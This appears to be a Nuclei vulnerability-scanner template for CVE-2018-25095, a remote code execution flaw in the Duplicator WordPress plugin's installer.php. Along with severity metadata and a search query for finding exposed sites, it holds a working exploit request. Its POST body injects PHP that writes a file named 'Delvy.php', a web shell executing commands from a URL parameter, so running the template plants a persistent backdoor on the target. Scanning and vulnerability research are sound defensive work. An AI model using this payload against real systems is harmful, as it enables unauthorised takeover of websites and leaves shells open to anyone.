id: CVE-2018-25095

info:
  name: Duplicator WordPress Plugin RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: The Duplicator WordPress plugin before 1.3.0 does not properly escape values when its installer script replaces values in WordPress configuration files, leading to unauthenticated RCE.
  impact: |
    Successful exploitation could allow an attacker to execute arbitrary code on the target system.
  remediation: |
    Update to the latest version of the Duplicator WordPress Plugin to mitigate CVE-2018-25095.
  reference:
    - https://wpscan.com/vulnerability/16cc47aa-cb31-4114-b014-7ac5fbc1d3ee
    - https://github.com/KTN1990/wordpress_duplicator_rce
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-25095
    epss-score: 0.00106
    epss-percentile: 0.44649
    cpe: cpe:2.3:a:snapcreek:duplicator:*:*:*:*:lite:wordpress:*:*
  metadata:
    vendor: snapcreek
    product: duplicator
    framework: wordpress
    google-query: inurl:"/wp-content/plugins/duplicator"
  tags: wpscan

http:
  - method: POST
    path:
      - "{{BaseURL}}/wordpress/installer.php"

    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    body: |
      action_ajax=2&action_step=2&url_new=TESTING');file_put_contents("Delvy.php",'<pre><?php system($_GET["cmd"]); ?></pre>'); /*
    matchers:
      - type: word
        words:
          - '"err_all":0'
          - '"warn_all":1'
        part: body
        condition: and
